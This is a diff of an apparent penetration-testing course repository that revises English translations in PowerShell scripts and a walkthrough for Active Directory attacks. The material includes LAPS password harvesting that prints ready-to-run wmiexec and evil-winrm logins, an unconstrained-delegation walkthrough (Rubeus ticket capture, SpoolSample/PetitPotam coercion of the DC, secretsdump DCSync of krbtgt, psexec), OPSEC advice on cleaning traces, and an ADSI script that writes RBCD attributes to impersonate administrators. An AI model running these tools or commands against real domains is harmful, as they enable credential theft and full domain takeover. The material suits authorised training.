         Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
         Write-Output ("      DN : " + (Get-M12Prop $r 'distinguishedName'))
     }
-    if (-not $found) { Write-Output "(None, indicating that no one has touched this attribute, which is exactly the state we can write)" }
+    if (-not $found) { Write-Output "  (none - nobody has touched this attribute, which is exactly the state we can write to)" }
     Write-Output ""
-    Write-Output "Next step: RBCD configuration m12-delegation-attacks.ps1 -Mode RBCD"
+    Write-Output "Next: configure RBCD with m12-delegation-attacks.ps1 -Mode RBCD"
 }
 
 # ---------------------------------------------------------------------------
-# ACL: read-only summary + high-risk permissions highlighting
+# ACL: read-only summary + high-risk permission highlighting
 # ---------------------------------------------------------------------------
 function Get-M12AclSummary {
     $target = $AclTarget
     if (-not $target) { $target = $script:RootPath -replace '^LDAP://', '' }
-    Write-M12Head "ACL summary (read only): $target"
+    Write-M12Head "ACL summary (read-only): $target"
     $interesting = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','ExtendedRight','CreateChild','Delete','WriteProperty','Self')
     $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$target")
     try {
         $rules = $de.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
     } catch {
-        Write-Output "[!] Failed to read ACL: $($_.Exception.Message) (no READ_CONTROL permission on the target object or wrong DN)"
-        Write-Output "Confirm the DN using the distinguishedName output by -Mode Computers, not the container name."
+        Write-Output "[!] Failed to read the ACL: $($_.Exception.Message) (no READ_CONTROL on the target object, or a wrong DN)"
+        Write-Output "    Confirm the DN using the distinguishedName printed by -Mode Computers, do not write a container name."
         return
     }
     $rows = @()
@@ -925,17 +925,17 @@ function Get-M12AclSummary {
         }
     }
     if ($rows.Count -eq 0) {
-        Write-Output "High-risk entries such as GenericAll/GenericWrite/WriteDacl/WriteOwner were not found (or the current identity cannot read the ACL)."
+        Write-Output "No GenericAll/GenericWrite/WriteDacl/WriteOwner or similar high-risk entries found (or the current identity cannot read the ACL)."
     } else {
         $rows | Sort-Object Principal | Format-Table -AutoSize Principal, Rights, Type, ObjectType, Inherited |
             Out-String -Width 220 | Write-Output
     }
-    Write-Output "Note: ObjectType is the GUID of the attribute/extended permission; when judging the LAPS readable permission, see whether it is equal to"
-    Write-Output "Schema GUID of ms-Mcs-AdmPwd (the measured results using -Mode LAPS are faster)."
+    Write-Output "Note: ObjectType is the GUID of an attribute/extended right; to judge LAPS read access, check whether it equals"
+    Write-Output "      the schema GUID of ms-Mcs-AdmPwd (the measured result from -Mode LAPS is quicker)."
 }
 
 # ---------------------------------------------------------------------------
-# LAPS: legacy(ms-Mcs-AdmPwd*) + Windows LAPS(msLAPS-*) + readability judgment
+# LAPS: legacy (ms-Mcs-AdmPwd*) + Windows LAPS (msLAPS-*) + readability verdict
 # ---------------------------------------------------------------------------
 function Get-M12Laps {
     Write-M12Head "LAPS enumeration (scenario 49)"
@@ -945,7 +945,7 @@ function Get-M12Laps {
     if ($name) {
         $filter = "(&(objectClass=computer)(sAMAccountName=$name))"
     } else {
-        # First detect "which machines have LAPS installed": the expiration time attribute is readable by default domain users and is an existence criterion.
+        # First probe which machines have LAPS installed: the expiration-time attribute is readable by Domain Users by default, so it is an existence test
         $filter = '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))'
     }
     $props = @('sAMAccountName','dnsHostName','distinguishedName',
@@ -967,50 +967,50 @@ function Get-M12Laps {
         $wexp  = Get-M12Prop $r 'msLAPS-PasswordExpirationTime'
         $wenc  = Get-M12Prop $r 'msLAPS-EncryptedPassword'
 
-        Write-Output ("Machine: {0} ({1})" -f $host1, $dns)
+        Write-Output ("Machine : {0}  ({1})" -f $host1, $dns)
         if ($pwd) {
             $legacyHits++
-            Write-Output ("[legacy LAPS] ms-Mcs-AdmPwd = {0} (expiration time {1})" -f $pwd, $exp)
-            Write-Output ("Execute: impacket-wmiexec DOMAIN/Administrator@{0} -p '{1}'" -f $dns, $pwd)
+            Write-Output ("  [legacy LAPS] ms-Mcs-AdmPwd = {0}   (expires {1})" -f $pwd, $exp)
+            Write-Output ("  Run: impacket-wmiexec DOMAIN/Administrator@{0} -p '{1}'" -f $dns, $pwd)
         }
         if ($wpwd) {
             $winlapsHits++
-            Write-Output ("[Windows LAPS plain text mode] msLAPS-Password = {0}" -f $wpwd)
+            Write-Output ("  [Windows LAPS cleartext mode] msLAPS-Password = {0}" -f $wpwd)
         }
         if ($wenc) {
             $encHits++
-            Write-Output ("[Windows LAPS Encryption Mode] msLAPS-EncryptedPassword exists ({0} bytes), plain LDAP cannot decipher the clear text" -f @($wenc).Count)
+            Write-Output ("  [Windows LAPS encrypted mode] msLAPS-EncryptedPassword present ({0} bytes); plain LDAP cannot decrypt the cleartext" -f @($wenc).Count)
         }
         if (-not $pwd -and -not $wpwd -and -not $wenc) {
-            Write-Output ("Only expiration time ({0}) has no password value -> LAPS has been deployed, but **current identity has no read permission**" -f $exp)
+            Write-Output ("  Only the expiration time ({0}) is present with no password value -> LAPS is deployed but **the current identity has no read access**" -f $exp)
         }
     }
 
     Write-Output ""
-    Write-Output "--- Readability judgment conclusion ---"
+    Write-Output "--- Readability verdict ---"
     if (($legacyHits + $winlapsHits) -gt 0) {
-        Write-Output "The current identity can read the plain text password -> Scenario 49 is established, directly use the wmiexec command above to implement it."
-        Write-Output "When only opening WinRM, change: evil-winrm -i $lastDns -u Administrator -p '<read password>'"
+        Write-Output "The current identity **can** read the cleartext password -> scenario 49 holds; land it with the wmiexec command above."
+        Write-Output "If only WinRM is open, use: evil-winrm -i $lastDns -u Administrator -p '<password you read>'"
     } elseif ($encHits -gt 0) {
-        Write-Output "Only see msLAPS-EncryptedPassword (DPAPI encryption): pure LDAP cannot get the clear text."
-        Write-Output "Alternatives: ① Find a machine that still uses legacy LAPS; ② Find a machine that has msLAPS-Password plain text mode turned on;"
-        Write-Output "③ Use the Windows LAPS module to read in the controlled domain administrator/local administrator session:"
-        Write-Output "Get-LapsADPassword -Identity TARGET -AsPlainText (Windows LAPS, RSAT/PowerShell 7 environment)"
-        Write-Output "Legacy LAPS client PowerShell module installed by msiexec: Import-Module AdmPwd.PS"
+        Write-Output "Only msLAPS-EncryptedPassword (DPAPI-encrypted) is visible: plain LDAP cannot get the cleartext."
+        Write-Output "Alternatives: 1) find a machine still on legacy LAPS; 2) find a machine with msLAPS-Password cleartext mode enabled;"
+        Write-Output "      3) read it from an already-controlled domain admin / local admin session with the Windows LAPS module:"
+        Write-Output "         Get-LapsADPassword -Identity TARGET -AsPlainText   (Windows LAPS, RSAT/PowerShell 7 environment)"
+        Write-Output "         legacy LAPS client PowerShell module installed by msiexec: Import-Module AdmPwd.PS"
         Write-Output "         Get-AdmPwdPassword -ComputerName TARGET"
     } else {
-        Write-Output "No password attributes were read: ① LAPS is not deployed in the domain; ② The current user does not have read permission for ms-Mcs-AdmPwd."
-        Write-Output "Change the angle: Find the subject in this domain that has ReadProperty for the LAPS attribute (see PowerView writing method)"
-        Write-Output "m12-laps-and-trust-notes.md), or use the RBCD/Delegation/Certificate entrance to get a higher identity first."
+        Write-Output "No password attribute read at all: 1) LAPS is not deployed in the domain; 2) the current user has no read access to ms-Mcs-AdmPwd."
+        Write-Output "Another angle: find the principals in this domain that have ReadProperty on the LAPS attributes (PowerView form in"
+        Write-Output "m12-laps-and-trust-notes.md), or use the RBCD/delegation/certificate entry point to reach a higher identity first."
     }
 
     Write-Output ""
-    Write-Output "--- Whether the LAPS client is installed locally (used to determine the version) ---"
+    Write-Output "--- Is a LAPS client installed locally (version check) ---"
     foreach ($p in @('C:\Program Files\LAPS\CSE\Admpwd.dll', 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll')) {
-        if (Test-Path $p) { Write-Output ("Legacy LAPS CSE exists:" + $p) }
+        if (Test-Path $p) { Write-Output ("  legacy LAPS CSE present: " + $p) }
     }
-    Write-Output "Windows LAPS: Built-in in Windows 11/2022+, check the registry HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS"
-    Write-Output "Or use Get-LapsADPassword to determine whether it is available."
+    Write-Output "  Windows LAPS: built into Windows 11/2022+, check the registry HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS"
+    Write-Output "              or judge by whether Get-LapsADPassword is available."
 }
 
 # ---------------------------------------------------------------------------
@@ -1019,34 +1019,34 @@ function Get-M12Laps {
 function Show-M12Help {
     Write-Output @"
 
-m12-ad-enum-windows.ps1 —— pure ADSI Domain enum (none) RSAT / none PowerView）
+m12-ad-enum-windows.ps1 - pure ADSI domain enumeration (no RSAT / no PowerView)
 
   .\m12-ad-enum-windows.ps1 -Mode All
-      run all：Domain / Users / Groups / Computers / SPN / Delegation / ACL / LAPS
+      run everything: Domain / Users / Groups / Computers / SPN / Delegation / ACL / LAPS
   .\m12-ad-enum-windows.ps1 -Mode Domain     [-Domain corp.local]
-      domain SID / MAQ（RBCD Add machine prerequisite）/ current status / DC list
+      domain SID / MAQ (a prerequisite for adding a machine for RBCD) / current identity / DC list
   .\m12-ad-enum-windows.ps1 -Mode Users      [-MaxResults 50]
-      user + AS-REP Roasting candidate
+      users + AS-REP Roasting candidates
   .\m12-ad-enum-windows.ps1 -Mode Groups
-      privileged group member（DA/EA/Schema/Builtin Admins）+ Full set list
+      privileged group members (DA/EA/Schema/Builtin Admins) + full group listing
   .\m12-ad-enum-windows.ps1 -Mode Computers
-      computer + OS + last login
+      computers + OS + last logon
   .\m12-ad-enum-windows.ps1 -Mode SPN
-      Kerberoast candidate + Service Account (scenario 52）
+      Kerberoast candidates + service accounts (scenario 52)
   .\m12-ad-enum-windows.ps1 -Mode Delegation
-      Unconstrained / constraint / RBCD Category three (scenario 50/51/52）
+      unconstrained / constrained / RBCD, all three (scenarios 50/51/52)
   .\m12-ad-enum-windows.ps1 -Mode ACL [-AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"]
-      read only ACL summary, highlight GenericAll/GenericWrite/WriteDacl/WriteOwner
+      read-only ACL summary, highlighting GenericAll/GenericWrite/WriteDacl/WriteOwner
   .\m12-ad-enum-windows.ps1 -Mode LAPS [-ComputerName WS02]
-      LAPS Two versions of reading + Readability judgment (scenario 49）
+      both LAPS versions + readability verdict (scenario 49)
 
-placeholder：DOMAIN=corp.local  TARGET=WS02  USER/PASS Appears only in subsequent print commands。
-This script only performs read operations and does not change any directory objects; see the write delegation attribute. m12-delegation-attacks.ps1。
+Placeholders: DOMAIN=corp.local  TARGET=WS02  USER/PASS appear only in the follow-up commands that get printed.
+This script only reads and never modifies a directory object; for writing delegation attributes see m12-delegation-attacks.ps1.
 "@
 }
 
 # ---------------------------------------------------------------------------
-# Main process
+# Main flow
 # ---------------------------------------------------------------------------
 if ($Help) { Show-M12Help; return }
 
@@ -1054,7 +1054,7 @@ try {
     Initialize-M12Root
 } catch {
     Write-Output "[!] Initialization failed: $($_.Exception.Message)"
-    Write-Output "Solution: Explicitly give -Domain DOMAIN (such as -Domain corp.local), or confirm that the machine is within the domain and the DC is reachable."
+    Write-Output "    Fix: pass -Domain DOMAIN explicitly (e.g. -Domain corp.local), or confirm the machine is in the domain and the DC is reachable."
     exit 1
 }
 
@@ -1073,43 +1073,43 @@ switch ($Mode) {
 }
 
 Write-Output ""
-Write-Output "[*] Done -Mode $Mode. Delegation/RBCD implementation: m12-delegation-attacks.ps1;"
-Write-Output "[*] Same enumeration on Linux side: m12-ad-enum-linux.sh; Trust and Extra SID: m12-laps-and-trust-notes.md"
+Write-Output "[*] Done -Mode $Mode. Delegation/RBCD landing: m12-delegation-attacks.ps1;"
+Write-Output "[*] Same enumeration on Linux: m12-ad-enum-linux.sh; trust and Extra SID: m12-laps-and-trust-notes.md"
 ````
 
-## Scenario 50: Control of an unconstrained delegation machine, but no domain-level identity yet
+## Scenario 50: You control an unconstrained delegation machine but have no domain-level identity yet
 
-**Situation**: Already controls a machine configured with **Unconstrained Delegation (Trusted for Delegation)** (can run Rubeus/trigger authentication); there is no domain management identity yet. The next step depends on being able to get a high-value identity (DC machine account or domain administrator) to authenticate to the machine and intercept its TGT.
+**Situation**: You control a machine configured for **unconstrained delegation (Trusted for Delegation)** and can run Rubeus / trigger authentication on it; you still have no domain admin identity. The next move depends on whether you can make a high-value identity (a DC machine account or a domain admin) authenticate to that machine and capture its TGT.
 
-**Assumptions**: The SPN port (445/5985 or 88 return connection) of the target DC/domain management can reach the unconstrained host; run the ticket capture tool as SYSTEM on the unconstrained host. Once the TGT of the DC machine account is obtained = DCSync is available (DC has replication permissions); the TGT of the domain manager = direct impersonation.
+**Assumptions**: The target DC's / domain admin's SPN ports (445/5985, or 88 for a callback) can reach the unconstrained host; you run the capture tool as SYSTEM on the unconstrained host. Once you hold the DC machine account's TGT you can DCSync (a DC holds replication rights); a domain admin's TGT means direct impersonation.
 
-**Prepare (attacker)**：非约束主机上准备 `Rubeus.exe` + 认证触发器（`SpoolSample.exe` / `printerbug` / `PetitPotam`）；攻击机准备 `impacket-ticketConverter` 与 `secretsdump`。诱导认证触发方式见 `m12-delegation-attacks.ps1 -Mode Unconstrained`。
+**Prepare (attacker side)**: On the unconstrained host, stage `Rubeus.exe` plus an authentication trigger (`SpoolSample.exe` / `printerbug` / `PetitPotam`); on the attack machine, stage `impacket-ticketConverter` and `secretsdump`. Trigger methods for induced authentication are in `m12-delegation-attacks.ps1 -Mode Unconstrained`.
 
-**Procedure**：
+**Procedure**:
 ```powershell
-# ① 非约束主机（SYSTEM）后台开抓票
+# 1) On the unconstrained host (SYSTEM), start capturing tickets in the background
 Rubeus.exe monitor /interval:5 /nowrap
-# ② 另开窗口诱导 DC 认证到本机（本机即被控非约束主机）
+# 2) In another window, coerce the DC into authenticating to this host (which is the unconstrained host we control)
 SpoolSample.exe DC01 $env:COMPUTERNAME        # or printerbug DC01 $env:COMPUTERNAME
-# ③ monitor 输出出现 DC01$ 的 base64 TGT → 存成 dc.txt
+# 3) When a base64 TGT for DC01$ shows up in the monitor output -> save it as dc.txt
 ```
 ```bash
-# ④ Attack aircraft conversion and utilization
+# 4) Convert and use it on the attack machine
 impacket-ticketConverter dc.txt dc.ccache
 export KRB5CCNAME=dc.ccache
-impacket-secretsdump -k -no-pass DC01.corp.local        # DC machine account → DCSync krbtgt/Domain management hash
-impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # After getting the hash
+impacket-secretsdump -k -no-pass DC01.corp.local        # DC machine account -> DCSync krbtgt/domain admin hashes
+impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # once you have the hash
 ```
-**Scripts used**: `m12-delegation-attacks.ps1` (Rubeus monitor + trigger + base64 export template; Linux side conversion command is also in the comments).
+**Scripts used**: `m12-delegation-attacks.ps1` (Rubeus monitor + trigger + base64 export template; the Linux-side conversion commands are in the comments too).
 
-**Validation**: `secretsdump` can dump the `krbtgt`/administrator hash, which proves that it is the DC machine TGT; first check whether the subject is `DC01$`.
+**Validation**: `secretsdump` dumping `krbtgt`/administrator hashes proves you captured the DC machine TGT; check with `klist` first that the principal is `DC01$`.
 
-**Failure branches and alternatives**：
-- SpoolSample No echo/Error reported (patched or RPC blocked）→ Change induction vector：`PetitPotam`(EFSRPC)、`DFSCoerce`、MS-RPRN Variants `dementor`；Still not working → Passive etc.：Rubeus monitor Hanging, waiting for the real domain administrator to log in to the machine or access local services。
-- What was caught was an ordinary user TGT（no DC/Domain management）→ Use it first horizontally (the machine that the user can access), or continue to wait for higher value authentication; also available `Rubeus harvest` Ideas to expand coverage。
-- Unconstrained hosts vs. DC Not in reachable network segment → When authentication cannot be induced, the value of the host is only"Passive collection"，Go back to enumeration and find other entrances (don’t waste time on impossible back connections)）。
+**Failure branches and alternatives**:
+- SpoolSample returns nothing / errors (patched, or RPC blocked) -> switch vector: `PetitPotam` (EFSRPC), `DFSCoerce`, the MS-RPRN variant `dementor`; still nothing -> go passive: leave Rubeus monitor running and wait for a real domain admin to log on to this machine or touch one of its services.
+- You captured a normal user's TGT (not a DC/domain admin) -> use it to move laterally first (the machines that user can reach), or keep waiting for a higher-value authentication; you can also widen coverage with the `Rubeus harvest` idea.
+- The unconstrained host and the DC are not in mutually reachable segments -> if you cannot induce authentication, the host's only remaining value is passive collection; go back to enumeration for another entry point (do not burn time on a callback that cannot happen).
 
-**Exam / OPSEC notes**: Running `Rubeus monitor` on an unconstrained host will continue to capture all certifications, and the log is obvious - it will stop when the task is completed (get the DC ticket); the captured tickets will be exported to the attack machine as soon as possible and then the local base64 text will be cleaned. Don’t use domain management TGT to jump directly to `psexec`. Confirm the value of `secretsdump` first and then decide the minimum action.
+**Exam / OPSEC notes**: Running `Rubeus monitor` on an unconstrained host captures every authentication continuously and is loud in the logs - stop it as soon as the job is done (the DC ticket is in hand); export captured tickets to the attack machine immediately and then clean up the local base64 text. Do not take a domain admin TGT and start `psexec`-ing everywhere; run `secretsdump` first to confirm the value, then choose the smallest action that works.
 
 ---
 
@@ -1117,67 +1117,67 @@ impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  
 
 ````powershell
 <#
-Purpose: Delegate a three-piece set Windows Side landing script——
-      RBCD：Query / Configure (put the fake machine account SID written to the target machine
-            msDS-AllowedToActOnBehalfOfOtherIdentity）/ rollback, pure ADSI + .NET accomplish；
-      Constrained delegation: enumerating service accounts msDS-AllowedToDelegateTo，and given S4U2Self+S4U2Proxy
-            Two sub-situations (with/no protocol conversion) Rubeus s4u and impacket-getST command template；
-      Unconstrained Delegation: Four Pre-Checks Before Utilization + Rubeus monitor / Induction authentication command template。
-scene：M12 scene 50（Unrestrained grasp DC TGT）、51（RBCD Impersonating an administrator）、52（Constraints are delegated to the specified SPN）。
-rely：ADSI / System.DirectoryServices / System.Security.AccessControl（The system comes with，
-      unnecessary RSAT of ActiveDirectory module）；
-      Rubeus.exe（s4u / monitor / ptt，You need to deliver it to this machine by yourself, use -ToolDir Refers to directory）；
-      SpoolSample.exe or printerbug（Inducement authentication trigger for unconstrained scenarios, optional）；
-      By default, only commands are printed, add -Execute to actually call the external exe（Avoid false triggers）。
-use：# 51 RBCD：Write and print subsequent commands on the attacking machine side
+Purpose: the Windows-side landing script for the delegation trio -
+      RBCD: query / configure (write the fake machine account SID into the target machine's
+            msDS-AllowedToActOnBehalfOfOtherIdentity) / roll back, in pure ADSI + .NET;
+      constrained delegation: enumerate a service account's msDS-AllowedToDelegateTo and give S4U2Self+S4U2Proxy
+            command templates for both sub-cases (with/without protocol transition) in Rubeus s4u and impacket-getST form;
+      unconstrained delegation: the four pre-flight checks plus Rubeus monitor / induced-authentication command templates.
+Scenario: M12 scenario 50 (unconstrained, capture the DC TGT), 51 (RBCD, impersonate an administrator), 52 (constrained delegation to a given SPN).
+Dependencies: ADSI / System.DirectoryServices / System.Security.AccessControl (built into the OS,
+      no RSAT ActiveDirectory module required);
+      Rubeus.exe (s4u / monitor / ptt; deliver it to the host yourself and point -ToolDir at its directory);
+      SpoolSample.exe or printerbug (the induced-authentication trigger for unconstrained scenarios, optional);
+      commands are printed by default; -Execute is what actually calls the external exe (to avoid accidental triggering).
+Usage: # 51 RBCD: write the attribute and print the attack-machine follow-up commands
       .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
-      # 51 RBCD: Task must be rolled back after completion
+      # 51 RBCD: must be rolled back after the job is done
       .\m12-delegation-attacks.ps1 -Mode RBCD-Rollback -TargetComputer WS02
-      # 52 Constrained delegation: See where svc_sql can be delegated, and print the commands for the two situations
+      # 52 constrained delegation: see where svc_sql can delegate to, and print the commands for both cases
       .\m12-delegation-attacks.ps1 -Mode Constrained -ServiceAccount svc_sql -Spn 'cifs/WS02.corp.local'
-      # 50 Unrestricted: Pre-use physical examination + ticket capture/trigger order
+      # 50 unconstrained: pre-flight check + ticket capture/trigger commands
       .\m12-delegation-attacks.ps1 -Mode Unconstrained -ToolDir C:\Tools -Execute
-      # Only enumerate three types of delegation status
+      # enumerate the current state of all three delegation types only
       .\m12-delegation-attacks.ps1 -Mode Enum
-placeholder：DOMAIN=domain FQDN（corp.local） TARGET=target host（WS02）
-      USER/PASS=Known credentials（Rubeus s4u Requires clear text for service account or rc4/aes）
-      ——Do not write the real domain name in the script/Password, all passed in as parameters or printed as placeholders for replacement。
-Test status: Not available Windows Domain environment actual measurement; native brackets/Quote pairing check passed。RBCD 写入用的是公开
-      通用的 RawSecurityDescriptor 二进制写法（等价 PowerView Set-DomainObject），
-      需要当前身份对目标计算机对象有 GenericWrite/GenericAll 或写该属性的权限。
-and docs/12-ad-attacks.md Description of the difference：
-  1) 文档 51 The scene is only given impacket Side process, write " AllowedToAct"Leave it to this script - this script
-     RBCD model**write-only properties**，Do not generate a machine account (add a machine for use as an attack machine) impacket-addcomputer，
-     -FakeAccount Refers to the account you have created; it is also applicable if you use a controlled service account as a fake subject）。
-  2) The documentation says"Use .NET ADSI to write security descriptors without relying on the ActiveDirectory module"——achieve consistency，
-     But note that if the attribute already has a value before writing, it will be Clear Write again, leaving no residue ACE。
-  3) Constraint the delegated ticket request itself（S4U2Self/S4U2Proxy）Cannot use pure .NET Complete, the script uses
-     WindowsIdentity Do a self-check on identity and delegation prerequisites, and provide actual ticket requests Rubeus / impacket
-     Two sets of copyable commands (similar to the document, only templates are given)）。
+Placeholders: DOMAIN=domain FQDN (corp.local) TARGET=target host (WS02)
+      USER/PASS=known credentials (Rubeus s4u needs the service account's cleartext password or rc4/aes key)
+      - no real domain names or passwords are written into the script; everything comes in as an argument or is printed as a placeholder for you to replace.
+Test status: not exercised in a Windows domain; bracket/quote pairing was checked locally. The RBCD write uses the publicly
+      known RawSecurityDescriptor binary form (equivalent to PowerView Set-DomainObject),
+      and requires the current identity to hold GenericWrite/GenericAll on the target computer object, or write access to that attribute.
+Differences from docs/12-ad-attacks.md:
+  1) The doc only gives the impacket side of scenario 51 and leaves 'write AllowedToAct' to this script - this script's
+     RBCD mode **only writes the attribute** and does not create a machine account (create the machine on the attack machine with impacket-addcomputer;
+     -FakeAccount names an account you already created; using a controlled service account as the fake principal works the same way).
+  2) The doc says 'write the security descriptor with .NET ADSI, without depending on the ActiveDirectory module' - the implementation matches,
+     but note that if the attribute already has a value it is Cleared before writing, so no stale ACE is left behind.
+  3) The constrained-delegation ticket request itself (S4U2Self/S4U2Proxy) cannot be done in pure .NET, so the script uses
+     WindowsIdentity for the identity and delegation-prerequisite self-check, and hands over the actual ticket request as copy-pasteable
+     Rubeus / impacket command sets (the doc likewise only gives templates).
 #>
 [CmdletBinding()]
 param(
     [ValidateSet('Enum','RBCD','RBCD-Rollback','Constrained','Unconstrained','Help')]
     [string]$Mode = 'Enum',
-    [string]$TargetComputer = '',      # TARGET：RBCD target machine / Native for unconstrained scenes
-    [string]$FakeAccount = '',         # fake machine account sAMAccountName，like FAKE01$
-    [string]$ServiceAccount = '',      # Service accounts that constrain delegation, such as svc_sql
-    [string]$ImpersonateUser = 'Administrator',  # The target user to impersonate
-    [string]$Spn = '',                 # target service SPN，like cifs/WS02.corp.local
-    [string]$Domain = '',              # DOMAIN：domain FQDN，Leave blank=current domain
-    [string]$ToolDir = '.',            # Rubeus.exe / SpoolSample.exe directory
-    [switch]$Execute,                  # really call Rubeus / Trigger (default only prints）
+    [string]$TargetComputer = '',      # TARGET: the RBCD target machine / this host for unconstrained scenarios
+    [string]$FakeAccount = '',         # fake machine account sAMAccountName, e.g. FAKE01$
+    [string]$ServiceAccount = '',      # constrained-delegation service account, e.g. svc_sql
+    [string]$ImpersonateUser = 'Administrator',  # the user to impersonate
+    [string]$Spn = '',                 # target service SPN, e.g. cifs/WS02.corp.local
+    [string]$Domain = '',              # DOMAIN: domain FQDN, blank = current domain
+    [string]$ToolDir = '.',            # directory holding Rubeus.exe / SpoolSample.exe
+    [switch]$Execute,                  # actually invoke Rubeus / the trigger (default is print only)
     [switch]$Help
 )
 
 $ErrorActionPreference = 'Continue'
 
-# Hang commonly used parameters into the script scope for each function to read (the function does not rely on the local scope of the caller)
+# Attach the common parameters to the script scope so every function can read them (functions do not rely on the caller's local scope)
 $script:ToolDir = $ToolDir
 $script:ImpersonateUser = $ImpersonateUser
 
 # ---------------------------------------------------------------------------
-# Public: Search root/sid/computer objects
+# Shared: search root / SID / computer objects
 # ---------------------------------------------------------------------------
 function Initialize-M12dRoot {
     if ($Domain) {
@@ -1188,7 +1188,7 @@ function Initialize-M12dRoot {
     $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
     $nc = $rootDse.Properties['defaultNamingContext']
     if (-not $nc -or $nc.Count -eq 0) {
-        throw "Unable to obtain defaultNamingContext: No domain added or LDAP is unreachable, please use -Domain DOMAIN to specify it explicitly"
+        throw "Cannot get defaultNamingContext: not domain-joined or LDAP unreachable; pass -Domain DOMAIN explicitly"
     }
     return "LDAP://$($nc[0])"
 }
@@ -1202,7 +1202,7 @@ function Get-M12dSid {
     [void]$s.PropertiesToLoad.Add('objectSid')
     [void]$s.PropertiesToLoad.Add('distinguishedName')
     $r = $s.FindOne()
-    if (-not $r) { throw "The account $SamAccountName cannot be found in the domain (the machine account must have a trailing $)" }
+    if (-not $r) { throw "Account $SamAccountName not found in the domain (machine accounts need the trailing $)" }
     $sid = New-Object System.Security.Principal.SecurityIdentifier($r.Properties['objectSid'][0], 0)
     return @($sid.Value, [string]$r.Properties['distinguishedName'][0])
 }
@@ -1217,43 +1217,43 @@ function Get-M12dComputerDn {
 
 function Write-M12dHead { param([string]$T) Write-Output ""; Write-Output "===== $T =====" }
 
-# Current identity self-check (WindowsIdentity / Impersonation level, determines whether tickets can be captured in the future)
+# Current identity self-check (WindowsIdentity / impersonation level, decides whether ticket capture is possible later)
 function Show-M12dIdentity {
     $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    Write-Output ("Current status:" + $id.Name)
+    Write-Output ("  Current identity : " + $id.Name)
     Write-Output ("  SID             : " + $id.User.Value)
-    Write-Output ("Certification type:" + $id.AuthenticationType)
-    Write-Output ("Simulation level:" + $id.ImpersonationLevel)
+    Write-Output ("  Auth type        : " + $id.AuthenticationType)
+    Write-Output ("  Impersonation    : " + $id.ImpersonationLevel)
     if ($id.User.Value -eq 'S-1-5-18') {
-        Write-Output "-> SYSTEM: You can run Rubeus monitor (you need to capture the TGT in LSASS)"
+        Write-Output "  -> SYSTEM: you can run Rubeus monitor (it needs to read TGTs out of LSASS)"
     } else {
-        Write-Output "-> Not SYSTEM. Rubeus monitor usually requires SYSTEM; local administrator + high integrity"
-        Write-Output "You can often run away, but the tickets you capture depend on your identity in the session."
+        Write-Output "  -> Not SYSTEM. Rubeus monitor normally needs SYSTEM; a local admin with high integrity"
+        Write-Output "     can often run it too, but the tickets you capture depend on the identities in the local sessions."
     }
     $p = New-Object System.Security.Principal.WindowsPrincipal($id)
-    if ($p.IsInRole('S-1-5-32-544')) { Write-Output "-> Belong to the local administrator group (elevate rights to SYSTEM and look at the M06 module)" }
+    if ($p.IsInRole('S-1-5-32-544')) { Write-Output "  -> member of the local Administrators group (for elevation to SYSTEM see module M06)" }
 }
 
 # ---------------------------------------------------------------------------
-# RBCD: Check/Write/Rollback
+# RBCD: read / write / roll back
 # ---------------------------------------------------------------------------
 function Get-M12dRbcd {
     param([Parameter(Mandatory = $true)][string]$ComputerName)
     $dn = Get-M12dComputerDn $ComputerName
     $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
     $raw = $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Value
-    Write-M12dHead "RBCD Current Status: $ComputerName"
+    Write-M12dHead "RBCD current state: $ComputerName"
     Write-Output ("  DN : " + $dn)
     if (-not $raw) {
-        Write-Output "The attribute is empty: no subject has been authorized yet, it is a clean state that can be written."
+        Write-Output "  Attribute is empty: no principal is authorized yet, which is the clean state we want to write to."
         return $dn
     }
     $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList @($raw, 0)
-    Write-Output ("Number of DACL entries:" + $sd.DiscretionaryAcl.Count)
+    Write-Output ("  DACL entry count : " + $sd.DiscretionaryAcl.Count)
     foreach ($ace in $sd.DiscretionaryAcl) {
         $who = $ace.SecurityIdentifier.Value
         try { $who = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { }
-        Write-Output ("Allow {0} to represent others in {1} manner" -f $who, $ace.AccessMask)
+        Write-Output ("   allows {0} to act on behalf of others as {1}" -f $who, $ace.AccessMask)
     }
     return $dn
 }
@@ -1266,7 +1266,7 @@ function Set-M12dRbcd {
     $dn = Get-M12dComputerDn $ComputerName
     $pair = Get-M12dSid $FakeSam
     $sid = $pair[0]
-    Write-M12dHead "Write to RBCD: $ComputerName <- $FakeSam ($sid)"
+    Write-M12dHead "Writing RBCD: $ComputerName <- $FakeSam ($sid)"
 
     $sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
     Write-Output ("  SDDL : " + $sddl)
@@ -1279,21 +1279,21 @@ function Set-M12dRbcd {
         $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
         $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Add($buf)
         $de.CommitChanges()
-        Write-Output "[+] Writing successful. Be sure to remember to use -Mode RBCD-Rollback after the task is completed."
+        Write-Output "  [+] Write succeeded. Remember to roll back with -Mode RBCD-Rollback when the job is done."
     } catch {
-        Write-Output ("[!] Write failed:" + $_.Exception.Message)
-        Write-Output "Troubleshooting: ① Does the current identity have GenericWrite/GenericAll for $dn?"
